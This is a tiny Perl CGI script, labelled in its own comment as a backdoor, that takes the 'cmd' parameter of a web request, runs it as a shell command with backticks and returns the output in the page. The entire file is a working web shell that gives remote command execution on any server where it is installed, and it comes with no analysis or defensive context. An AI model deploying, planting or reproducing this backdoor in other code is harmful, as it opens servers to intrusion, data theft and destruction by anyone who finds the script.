#!/usr/bin/perl
#A smal backdoor being run by http://127.0.0.1/cgi-bin/cgi_backdoor.pl?cmd=ls -al
use CGI qw/:standard/;
print "Content-type: text/html\n\n";
$q = CGI->new();
$value = $q->param('cmd');
sprintf $output=`$value`;
print $output;
